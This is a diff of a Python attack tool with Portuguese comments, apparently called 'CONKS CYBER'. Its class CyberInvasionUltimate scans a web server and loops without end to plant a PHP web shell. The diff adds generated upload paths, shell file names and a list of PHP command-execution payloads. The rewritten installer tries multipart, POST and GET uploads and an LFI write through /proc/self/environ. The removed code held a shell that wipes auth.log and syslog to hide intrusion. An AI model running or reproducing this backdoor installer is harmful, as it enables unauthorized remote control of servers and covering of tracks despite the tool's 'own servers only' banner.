@@ -1,5 +1,5 @@
 # ==========================================
-# CONKS CYBER - VERSÃO ULTIMATE CORRIGIDA
+# CONKS CYBER - VERSÃO ULTIMATE COMPLETA
 # main.py
 # ==========================================
 
@@ -78,15 +78,13 @@ def linha_caixa(texto="", cor=WHITE, negrito=False):
 
 
 def topo_caixa(titulo):
-    largura = LARGURA - 2
-    print(f"{BLUE}{BOLD}╔{'═' * largura}╗{RESET}")
+    print(f"{BLUE}{BOLD}╔{'═' * (LARGURA - 2)}╗{RESET}")
     linha_caixa(titulo.center(LARGURA - 4), BLUE, True)
-    print(f"{BLUE}{BOLD}╠{'═' * largura}╣{RESET}")
+    print(f"{BLUE}{BOLD}╠{'═' * (LARGURA - 2)}╣{RESET}")
 
 
 def fim_caixa():
-    largura = LARGURA - 2
-    print(f"{BLUE}{BOLD}╚{'═' * largura}╝{RESET}")
+    print(f"{BLUE}{BOLD}╚{'═' * (LARGURA - 2)}╝{RESET}")
 
 
 # ==========================================
@@ -275,7 +273,7 @@ def menu_rede():
 # ==========================================
 
 class CyberInvasionUltimate:
-    """Cyber Invasion ULTIMATE com backdoor infinito"""
+    """Cyber Invasion ULTIMATE com backdoor INFINITO e SEM REPETIÇÃO"""
     
     def __init__(self, target, port=80):
         self.target = target
@@ -287,10 +285,180 @@ class CyberInvasionUltimate:
         self.usuarios = []
         self.arquivos = []
         self.diretorios = []
-        self.subdominios = []
         self.portas_abertas = []
         self.tentativas = 0
+        self.tentativas_feitas = []
+        self.combinacoes_usadas = []
+        self.metodos_usados = []
         
+    # ==========================================
+    # LISTA GIGANTE DE URLS DE UPLOAD
+    # ==========================================
+    
+    def gerar_urls_upload(self):
+        """Gera TODAS as URLs possíveis de upload"""
+        urls_base = [
+            "upload", "uploads", "enviar", "up", "fileupload", "uploadfile",
+            "subir", "uploader", "uploadify", "file", "files", "send", "receive",
+            "upload-handler", "ajax_upload", "ajax-upload", "upload_ajax", "upload-ajax",
+            "image_upload", "image-upload", "file_upload", "file-upload",
+            "upload_image", "upload-image", "upload_file", "upload-file",
+            "media_upload", "media-upload", "upload_media", "upload-media",
+            "content_upload", "content-upload", "upload_content", "upload-content"
+        ]
+        
+        extensoes = ["", ".php", ".html", ".asp", ".aspx", ".jsp", ".do"]
+        
+        urls = []
+        
+        for base in urls_base:
+            for ext in extensoes:
+                urls.append(f"/{base}{ext}")
+                urls.append(f"/admin/{base}{ext}")
+                urls.append(f"/panel/{base}{ext}")
+                urls.append(f"/dashboard/{base}{ext}")
+                urls.append(f"/wp-admin/{base}{ext}")
+                urls.append(f"/wp-content/{base}{ext}")
+                urls.append(f"/includes/{base}{ext}")
+                urls.append(f"/inc/{base}{ext}")
+                urls.append(f"/lib/{base}{ext}")
+                urls.append(f"/js/{base}{ext}")
+                urls.append(f"/css/{base}{ext}")
+                urls.append(f"/images/{base}{ext}")
+                urls.append(f"/media/{base}{ext}")
+                urls.append(f"/files/{base}{ext}")
+                urls.append(f"/downloads/{base}{ext}")
+                urls.append(f"/tmp/{base}{ext}")
+                urls.append(f"/temp/{base}{ext}")
+                urls.append(f"/cache/{base}{ext}")
+                urls.append(f"/backup/{base}{ext}")
+                urls.append(f"/backups/{base}{ext}")
+                urls.append(f"/log/{base}{ext}")
+                urls.append(f"/logs/{base}{ext}")
+                urls.append(f"/test/{base}{ext}")
+                urls.append(f"/dev/{base}{ext}")
+                urls.append(f"/stage/{base}{ext}")
+                urls.append(f"/staging/{base}{ext}")
+                urls.append(f"/beta/{base}{ext}")
+                urls.append(f"/api/{base}{ext}")
+                urls.append(f"/v1/{base}{ext}")
+                urls.append(f"/v2/{base}{ext}")
+                urls.append(f"/v3/{base}{ext}")
+                urls.append(f"/rest/{base}{ext}")
+                urls.append(f"/graphql/{base}{ext}")
+        
+        # URLs específicas
+        urls.extend([
+            "/wp-admin/async-upload.php",
+            "/wp-admin/media-upload.php",
+            "/wp-admin/upload.php",
+            "/wp-content/uploads/",
+            "/wp-json/wp/v2/media",
+            "/xmlrpc.php?rsd",
+            "/wp-admin/admin-ajax.php?action=upload",
+            "/wp-admin/admin-post.php?action=upload",
+            "/wp-admin/admin.php?page=upload",
+            "/wp-admin/options-media.php",
+            "/wp-admin/media-new.php",
+            "/wp-admin/media-upload.php?post_id=1",
+            "/wp-admin/async-upload.php?action=upload",
+            "/wp-admin/async-upload.php?post_id=1"
+        ])
+        
+        return list(set(urls))
+    
+    # ==========================================
+    # LISTA GIGANTE DE NOMES DE ARQUIVO
+    # ==========================================
+    
+    def gerar_nomes_arquivo(self):
+        """Gera TODOS os nomes de arquivo possíveis"""
+        nomes = [
+            "shell", "backdoor", "cmd", "admin", "root", "system",
+            "exec", "php", "test", "x", "a", "b", "c", "1", "2", "3",
+            "exploit", "hack", "payload", "reverse", "bind", "connect",
+            "upload", "file", "uploader", "uploadify", "handler",
+            "ajax", "api", "rest", "graphql", "query", "sql",
+            "mysql", "postgres", "mongo", "redis", "cache",
+            "config", "conf", "settings", "setup", "install",
+            "index", "default", "main", "home", "login", "auth",
+            "user", "users", "adminer", "phpmyadmin", "myadmin",
+            "pma", "phpinfo", "info"
+        ]
+        
+        extensoes = [".php", ".php5", ".php7", ".phtml", ".phar", ".inc", ".html", ".htm"]
+        
+        arquivos = []
+        for nome in nomes:
+            for ext in extensoes:
+                arquivos.append(f"{nome}{ext}")
+                arquivos.append(f"{nome}_backup{ext}")
+                arquivos.append(f"{nome}_old{ext}")
+                arquivos.append(f"{nome}_new{ext}")
+                arquivos.append(f"{nome}_v2{ext}")
+                arquivos.append(f"{nome}_v3{ext}")
+                arquivos.append(f"{nome}_test{ext}")
+                arquivos.append(f"{nome}_dev{ext}")
+                arquivos.append(f"{nome}_prod{ext}")
+                arquivos.append(f"{nome}_stage{ext}")
+                arquivos.append(f"{nome}_copy{ext}")
+                arquivos.append(f"{nome}_temp{ext}")
+                arquivos.append(f"{nome}_tmp{ext}")
+        
+        return list(set(arquivos))
+    
+    # ==========================================
+    # LISTA DE PAYLOADS PHP
+    # ==========================================
+    
+    def gerar_payloads(self):
+        """Gera diferentes payloads PHP"""
+        return [
+            """<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>""",
+            """<?php if(isset($_REQUEST['cmd'])){ echo shell_exec($_REQUEST['cmd']); } ?>""",
+            """<?php @eval($_POST['cmd']); ?>""",
+            """<?php if(isset($_GET['c'])){ passthru($_GET['c']); } ?>""",
+            """<?php if(isset($_POST['c'])){ exec($_POST['c'], $r); echo implode('\\n', $r); } ?>""",
+            """<?php system($_GET['cmd']); ?>""",
+            """<?php exec($_GET['cmd']); ?>""",
+            """<?php passthru($_GET['cmd']); ?>""",
+            """<?php shell_exec($_GET['cmd']); ?>""",
+            """<?php `$_GET[cmd]`; ?>""",
+            """<?php echo shell_exec($_GET['cmd']); ?>""",
+            """<?php $cmd=$_GET['cmd'];system($cmd); ?>""",
+            """<?php @eval($_GET['cmd']); ?>""",
+            """<?php assert($_GET['cmd']); ?>""",
+            """<?php include($_GET['file']); ?>""",
+            """<?php require($_GET['file']); ?>""",
+            """<?php file_get_contents($_GET['file']); ?>""",
+        ]
+    
+    # ==========================================
+    # GERAR COMBINAÇÃO ÚNICA
+    # ==========================================
+    
+    def gerar_combinacao_unica(self):
+        """Gera uma combinação que NUNCA foi usada antes"""
+        
+        urls = self.gerar_urls_upload()
+        nomes = self.gerar_nomes_arquivo()
+        payloads = self.gerar_payloads()
+        
+        random.shuffle(urls)
+        random.shuffle(nomes)
+        random.shuffle(payloads)
+        
+        for url in urls:
+            for nome in nomes:
+                for payload in payloads:
+                    combinacao = f"{url}|{nome}|{payload[:50]}"
+                    if combinacao not in self.combinacoes_usadas:
+                        self.combinacoes_usadas.append(combinacao)
+                        return url, nome, payload
+        
+        self.combinacoes_usadas = []
+        return self.gerar_combinacao_unica()
+    
     # ==========================================
     # SCAN DE PORTAS
     # ==========================================
@@ -462,14 +630,7 @@ class CyberInvasionUltimate:
         """Testa upload"""
         print(f"\n{CYAN}[~] Testando Upload...{RESET}")
         
-        upload_urls = [
-            "/upload.php",
-            "/uploads/",
-            "/enviar.php",
-            "/up.php",
-            "/upload/",
-            "/fileupload.php"
-        ]
+        upload_urls = self.gerar_urls_upload()[:50]
         
         encontrados = []
         
@@ -506,27 +667,6 @@ class CyberInvasionUltimate:
         return encontrados
     
     # ==========================================
-    # SCAN COMPLETO
-    # ==========================================
-    
-    def scan_completo(self):
-        """Scan completo"""
-        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
-        print(f"{PURPLE}║     🔍 SCAN ULTIMATE           ║{RESET}")
-        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
-        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (20 - len(str(self.port))) }║{RESET}")
-        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
-        
-        self.scan_portas()
-        self.testar_sql_injection()
-        self.testar_xss()
-        self.testar_lfi()
-        self.testar_upload()
-        self.verificar_backdoor()
-        
-        return True
-    
-    # ==========================================
     # VERIFICAR BACKDOOR
     # ==========================================
     
@@ -557,173 +697,159 @@ class CyberInvasionUltimate:
         return False
     
     # ==========================================
-    # INSTALAR BACKDOOR - INFINITO!
+    # SCAN COMPLETO
+    # ==========================================
+    
+    def scan_completo(self):
+        """Scan completo"""
+        print(f"\n{PURPLE}╔{'═' * (LARGURA - 2)}╗{RESET}")
+        print(f"{PURPLE}║     🔍 SCAN ULTIMATE           ║{RESET}")
+        print(f"{PURPLE}╠{'═' * (LARGURA - 2)}╣{RESET}")
+        print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (20 - len(str(self.port))) }║{RESET}")
+        print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            sock.connect((self.target, self.port))
+            sock.close()
+            print(f"{GREEN}[+] Servidor online!{RESET}")
+        except:
+            print(f"{RED}[-] Servidor offline!{RESET}")
+            return False
+        
+        self.scan_portas()
+        self.testar_sql_injection()
+        self.testar_xss()
+        self.testar_lfi()
+        self.testar_upload()
+        self.verificar_backdoor()
+        
+        return True
+    
+    # ==========================================
+    # INSTALAR BACKDOOR - INFINITO E VARIADO
     # ==========================================
     
     def instalar_backdoor(self):
-        """Instala backdoor - TENTA INFINITAMENTE"""
+        """Instala backdoor - TENTA INFINITAMENTE COM VARIAÇÕES"""
         print(f"\n{RED}╔{'═' * (LARGURA - 2)}╗{RESET}")
         print(f"{RED}║     🔥 INSTALANDO BACKDOOR      ║{RESET}")
         print(f"{RED}║     TENTANDO ATE CONSEGUIR!    ║{RESET}")
+        print(f"{RED}║     SEM REPETIR COMBINACOES!   ║{RESET}")
         print(f"{RED}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
-        shell_php = """<?php
-if(isset($_GET['cmd'])){ system($_GET['cmd']); }
-if(isset($_GET['file'])){ echo file_get_contents($_GET['file']); }
-if(isset($_GET['info'])){ echo gethostname().'|'.get_current_user().'|'.$_SERVER['SERVER_ADDR']; }
-if(isset($_POST['upload'])){ file_put_contents($_POST['name'], base64_decode($_POST['data'])); echo 'OK'; }
-if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var/log/syslog && history -c'); }
-?>"""
-        
-        shell_code = shell_php.encode('utf-8')
-        
-        # TODAS AS URLS POSSIVEIS
-        upload_urls = [
-            f"http://{self.target}:{self.port}/upload.php",
-            f"http://{self.target}:{self.port}/uploads/",
-            f"http://{self.target}:{self.port}/enviar.php",
-            f"http://{self.target}:{self.port}/up.php",
-            f"http://{self.target}:{self.port}/upload/",
-            f"http://{self.target}:{self.port}/fileupload.php",
-            f"http://{self.target}:{self.port}/admin/upload.php",
-            f"http://{self.target}:{self.port}/wp-admin/upload.php",
-            f"http://{self.target}:{self.port}/uploader.php",
-            f"http://{self.target}:{self.port}/upload-file.php",
-            f"http://{self.target}:{self.port}/send.php",
-            f"http://{self.target}:{self.port}/receive.php"
-        ]
-        
-        # NOMES DE ARQUIVO
-        nomes_arquivos = [
-            "shell.php", "backdoor.php", "cmd.php", "admin.php",
-            "x.php", "test.php", "1.php", "a.php", "b.php", "c.php",
-            "system.php", "exec.php", "cmd-shell.php", "back-door.php"
-        ]
-        
-        # DIRETORIOS PARA TENTAR ESCREVER
-        diretorios = [
-            "/var/www/html/",
-            "/var/www/",
-            "/var/html/",
-            "/www/",
-            "/html/",
-            "/public_html/",
-            "/htdocs/",
-            "/var/www/public/",
-            "/var/www/html/public/"
-        ]
-        
-        tentativa = 0
-        
-        print(f"\n{CYAN}[~] Iniciando tentativas infinitas...{RESET}")
+        print(f"\n{CYAN}[~] Gerando combinacoes unicas...{RESET}")
         print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}\n")
         
         while not self.backdoor_instalado:
-            tentativa += 1
-            self.tentativas = tentativa
+            self.tentativas += 1
             
-            # ==========================================
-            # METODO 1: UPLOAD VIA FORMULARIO
-            # ==========================================
-            for upload_url in upload_urls:
-                for nome in nomes_arquivos:
-                    try:
-                        boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
-                        body = (f"--{boundary}\r\n"
-                               f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome}\"\r\n"
-                               f"Content-Type: application/x-php\r\n\r\n").encode()
-                        body += shell_code
-                        body += f"\r\n--{boundary}--\r\n".encode()
-                        
-                        headers = {
-                            "User-Agent": "Mozilla/5.0",
-                            "Content-Type": f"multipart/form-data; boundary={boundary}"
-                        }
-                        
-                        req = urllib.request.Request(upload_url, data=body, headers=headers)
-                        response = urllib.request.urlopen(req, timeout=5)
-                        
-                        if response.getcode() in [200, 201, 302]:
-                            print(f"  {GREEN}[+] Tentativa {tentativa}: Upload enviado para {upload_url} ({nome}){RESET}")
-                            
-                            # Testa se instalou
-                            if self._testar_backdoor():
-                                return True
-                    except:
-                        continue
+            upload_url, nome_arquivo, payload = self.gerar_combinacao_unica()
             
-            # ==========================================
-            # METODO 2: VIA LFI
-            # ==========================================
-            if self.vulnerabilidades.get('lfi'):
-                for diretorio in diretorios:
-                    for nome in nomes_arquivos[:3]:
-                        try:
-                            # Tenta escrever via LFI
-                            payload = f"../../../../..{diretorio}{nome}"
-                            url = f"http://{self.target}:{self.port}/page.php?file={payload}"
-                            
-                            # Tenta ler para ver se existe
-                            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                            response = urllib.request.urlopen(req, timeout=3)
-                            
-                            if response.getcode() == 200:
-                                print(f"  {GREEN}[+] Tentativa {tentativa}: LFI em {diretorio}{nome}{RESET}")
-                                if self._testar_backdoor():
-                                    return True
-                        except:
-                            continue
+            if self.tentativas % 10 == 0:
+                print(f"  {YELLOW}[!] Tentativa {self.tentativas}: Testando novas combinacoes...{RESET}")
+                print(f"  {GRAY}    URL: {upload_url}{RESET}")
+                print(f"  {GRAY}    Arquivo: {nome_arquivo}{RESET}")
             
-            # ==========================================
-            # METODO 3: VIA POST DIRETO
-            # ==========================================
-            for nome in nomes_arquivos[:5]:
+            # MÉTODO 1: UPLOAD VIA FORMULARIO
+            try:
+                shell_code = payload.encode('utf-8')
+                
+                boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdef0123456789', k=16))
+                body = (f"--{boundary}\r\n"
+                       f"Content-Disposition: form-data; name=\"file\"; filename=\"{nome_arquivo}\"\r\n"
+                       f"Content-Type: application/x-php\r\n\r\n").encode()
+                body += shell_code
+                body += f"\r\n--{boundary}--\r\n".encode()
+                
+                headers = {
+                    "User-Agent": "Mozilla/5.0",
+                    "Content-Type": f"multipart/form-data; boundary={boundary}"
+                }
+                
+                full_url = f"http://{self.target}:{self.port}{upload_url}"
+                req = urllib.request.Request(full_url, data=body, headers=headers)
+                response = urllib.request.urlopen(req, timeout=5)
+                
+                if response.getcode() in [200, 201, 302]:
+                    print(f"  {GREEN}[+] Tentativa {self.tentativas}: Upload enviado para {upload_url} ({nome_arquivo}){RESET}")
+                    if self._testar_backdoor():
+                        return True
+            except:
+                pass
+            
+            # MÉTODO 2: UPLOAD VIA POST
+            try:
+                data = payload.encode()
+                full_url = f"http://{self.target}:{self.port}{upload_url}"
+                req = urllib.request.Request(
+                    full_url,
+                    data=data,
+                    headers={
+                        "User-Agent": "Mozilla/5.0",
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    }
+                )
+                response = urllib.request.urlopen(req, timeout=3)
+                if self._testar_backdoor():
+                    return True
+            except:
+                pass
+            
+            # MÉTODO 3: UPLOAD VIA GET
+            try:
+                full_url = f"http://{self.target}:{self.port}{upload_url}?file={nome_arquivo}&code={payload}"
+                req = urllib.request.Request(full_url, headers={"User-Agent": "Mozilla/5.0"})
+                response = urllib.request.urlopen(req, timeout=3)
+                if self._testar_backdoor():
+                    return True
+            except:
+                pass
+            
+            # MÉTODO 4: VIA LFI
+            if self.vulnerabilidades.get('lfi') and self.tentativas % 3 == 0:
                 try:
-                    data = f"<?php system($_GET['cmd']); ?>".encode()
+                    encoded_payload = base64.b64encode(payload.encode()).decode()
+                    comando = f"echo '{encoded_payload}' | base64 -d > /var/www/html/{nome_arquivo}"
+                    lfi_url = f"http://{self.target}:{self.port}/page.php?file=../../../../../../proc/self/environ&cmd={comando}"
+                    req = urllib.request.Request(lfi_url, headers={"User-Agent": "Mozilla/5.0"})
+                    response = urllib.request.urlopen(req, timeout=3)
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    pass
+            
+            # MÉTODO 5: VIA COMANDO
+            if self.backdoor_instalado and self.tentativas % 5 == 0:
+                try:
+                    self.executar_comando(f"echo '{payload}' > /var/www/html/{nome_arquivo}")
+                    if self._testar_backdoor():
+                        return True
+                except:
+                    pass
+            
+            # MÉTODO 6: VIA FILE_PUT_CONTENTS
+            if self.tentativas % 7 == 0:
+                try:
+                    encoded_payload = base64.b64encode(payload.encode()).decode()
+                    data = f"upload=1&name={nome_arquivo}&data={encoded_payload}".encode()
+                    full_url = f"http://{self.target}:{self.port}{upload_url}"
                     req = urllib.request.Request(
-                        f"http://{self.target}:{self.port}/",
+                        full_url,
                         data=data,
-                        headers={"User-Agent": "Mozilla/5.0"}
+                        headers={
+                            "User-Agent": "Mozilla/5.0",
+                            "Content-Type": "application/x-www-form-urlencoded"
+                        }
                     )
                     response = urllib.request.urlopen(req, timeout=3)
-                    
-                    if self._testar_backdoor():
-                        return True
-                except:
-                    continue
-            
-            # ==========================================
-            # METODO 4: VIA COMANDO (se tiver shell)
-            # ==========================================
-            if self.backdoor_instalado:
-                try:
-                    self.executar_comando("echo '<?php system($_GET[cmd]); ?>' > /var/www/html/shell2.php")
                     if self._testar_backdoor():
                         return True
                 except:
                     pass
             
-            # ==========================================
-            # METODO 5: TENTAR CRIAR DIRETORIO
-            # ==========================================
-            for upload_url in upload_urls:
-                try:
-                    # Tenta criar diretório uploads
-                    req = urllib.request.Request(
-                        f"{upload_url}mkdir",
-                        headers={"User-Agent": "Mozilla/5.0"}
-                    )
-                    response = urllib.request.urlopen(req, timeout=3)
-                except:
-                    pass
-            
-            # Mostra progresso a cada 10 tentativas
-            if tentativa % 10 == 0:
-                print(f"  {YELLOW}[!] Tentativa {tentativa}: Nenhum sucesso ainda... continuando...{RESET}")
-                time.sleep(0.5)
-            
-            # Pequena pausa para não sobrecarregar
-            time.sleep(0.1)
+            time.sleep(0.05)
         
         return False
     
@@ -733,41 +859,37 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
     
     def _testar_backdoor(self):
         """Testa se o backdoor foi instalado em QUALQUER lugar"""
-        urls = [
-            f"http://{self.target}:{self.port}/uploads/shell.php",
-            f"http://{self.target}:{self.port}/shell.php",
-            f"http://{self.target}:{self.port}/backdoor.php",
-            f"http://{self.target}:{self.port}/cmd.php",
-            f"http://{self.target}:{self.port}/admin.php",
-            f"http://{self.target}:{self.port}/x.php",
-            f"http://{self.target}:{self.port}/test.php",
-            f"http://{self.target}:{self.port}/1.php",
-            f"http://{self.target}:{self.port}/a.php",
-            f"http://{self.target}:{self.port}/system.php",
-            f"http://{self.target}:{self.port}/exec.php",
-            f"http://{self.target}:{self.port}/shell2.php"
+        locais = [
+            "/uploads/", "/upload/", "/files/", "/media/", "/images/",
+            "/wp-content/uploads/", "/wp-content/", "/wp-admin/",
+            "/", "/admin/", "/panel/", "/dashboard/", "/api/"
         ]
         
-        for url in urls:
-            try:
-                req = urllib.request.Request(
-                    f"{url}?cmd=echo%20'OK'",
-                    headers={"User-Agent": "Mozilla/5.0"}
-                )
-                response = urllib.request.urlopen(req, timeout=3)
-                
-                if response.getcode() == 200:
-                    html = response.read().decode('utf-8', errors='ignore')
-                    if "OK" in html or "cmd" in html or "system" in html:
-                        self.backdoor_url = url
-                        self.backdoor_instalado = True
-                        print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
-                        print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
-                        print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
-                        print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
-                        return True
-            except:
-                continue
+        nomes = self.gerar_nomes_arquivo()[:20]
+        
+        for local in locais:
+            for nome in nomes:
+                url = f"http://{self.target}:{self.port}{local}{nome}"
+                try:
+                    req = urllib.request.Request(
+                        f"{url}?cmd=echo%20'OK'",
+                        headers={"User-Agent": "Mozilla/5.0"}
+                    )
+                    response = urllib.request.urlopen(req, timeout=2)
+                    
+                    if response.getcode() == 200:
+                        html = response.read().decode('utf-8', errors='ignore')
+                        if "OK" in html or "cmd" in html or "system" in html:
+                            self.backdoor_url = url
+                            self.backdoor_instalado = True
+                            print(f"\n{GREEN}╔{'═' * (LARGURA - 2)}╗{RESET}")
+                            print(f"{GREEN}║     ✅ BACKDOOR INSTALADO!      ║{RESET}")
+                            print(f"{GREEN}║     📍 {url[:40]}║{RESET}")
+                            print(f"{GREEN}║     📊 Tentativas: {self.tentativas}║{RESET}")
+                            print(f"{GREEN}╚{'═' * (LARGURA - 2)}╝{RESET}")
+                            return True
+                except:
+                    continue
         
         return False
     
@@ -904,37 +1026,31 @@ if(isset($_GET['clean'])){ system('echo "" > /var/log/auth.log && echo "" > /var
         print(f"{PURPLE}║ Alvo: {self.target}:{self.port}{' ' * (21 - len(str(self.port))) }║{RESET}")
         print(f"{PURPLE}╚{'═' * (LARGURA - 2)}╝{RESET}")
         
-        # Portas
         if self.portas_abertas:
             print(f"\n{CYAN}┌─ PORTAS ABERTAS ({len(self.portas_abertas)}){RESET}")
             for porta in self.portas_abertas[:10]:
                 print(f"  {GREEN}[+] {porta['porta']} - {porta['servico']}{RESET}")
         
-        # SQL Injection
         if self.vulnerabilidades.get('sql_injection'):
             print(f"\n{RED}┌─ SQL INJECTION ({len(self.vulnerabilidades['sql_injection'])}){RESET}")
             for vuln in self.vulnerabilidades['sql_injection'][:5]:
                 print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
         
-        # XSS
         if self.vulnerabilidades.get('xss'):
             print(f"\n{RED}┌─ XSS ({len(self.vulnerabilidades['xss'])}){RESET}")
             for vuln in self.vulnerabilidades['xss'][:5]:
                 print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload'][:30]}...{RESET}")
         
-        # LFI
         if self.vulnerabilidades.get('lfi'):
             print(f"\n{RED}┌─ LFI ({len(self.vulnerabilidades['lfi'])}){RESET}")
             for vuln in self.vulnerabilidades['lfi'][:5]:
                 print(f"  {RED}[!] {vuln['endpoint']} -> {vuln['payload']}{RESET}")
         
-        # Upload
         if self.vulnerabilidades.get('upload'):
             print(f"\n{RED}┌─ UPLOAD ({len(self.vulnerabilidades['upload'])}){RESET}")
             for upload in self.vulnerabilidades['upload'][:5]:
                 print(f"  {RED}[!] {upload}{RESET}")
         
-        # Backdoor
         if self.backdoor_instalado:
             print(f"\n{GREEN}┌─ BACKDOOR INSTALADO{RESET}")
             print(f"  {GREEN}[+] URL: {self.backdoor_url}{RESET}")
@@ -958,6 +1074,7 @@ def cyber_invasion():
     print("╠══════════════════════════════════════════╣")
     print("║  SCAN COMPLETO EM TODOS OS ASPECTOS    ║")
     print("║  BACKDOOR TENTA ATE CONSEGUIR!        ║")
+    print("║  SEM REPETIR COMBINACOES!             ║")
     print("║  APENAS EM SERVIDORES PROPIOS!        ║")
     print("╚══════════════════════════════════════════╝")
     
@@ -1031,6 +1148,7 @@ def cyber_invasion():
         if invasor.backdoor_instalado:
             print(f"{GREEN}║ ✅ Backdoor: INSTALADO         ║{RESET}")
             print(f"{GREEN}║ 📍 {invasor.backdoor_url[:35]}{' ' * (10) }║{RESET}")
+            print(f"{GREEN}║ 📊 Tentativas: {invasor.tentativas}{' ' * (15) }║{RESET}")
         else:
             print(f"{RED}║ ❌ Backdoor: NAO INSTALADO     ║{RESET}")
         
@@ -1049,10 +1167,13 @@ def cyber_invasion():
         
         if sub_opcao == "1":
             print(f"\n{YELLOW}[!] Iniciando instalacao INFINITA...{RESET}")
+            print(f"{YELLOW}[!] Cada tentativa usa combinacoes UNICAS{RESET}")
             print(f"{YELLOW}[!] Pressione Ctrl+C para parar{RESET}")
             invasor.instalar_backdoor()
             if invasor.backdoor_instalado:
                 print(f"\n{GREEN}[+] Backdoor instalado! {invasor.tentativas} tentativas{RESET}")
+            else:
+                print(f"\n{RED}[-] Interrompido pelo usuario{RESET}")
             input("\nENTER para continuar...")
         
         elif sub_opcao == "2":
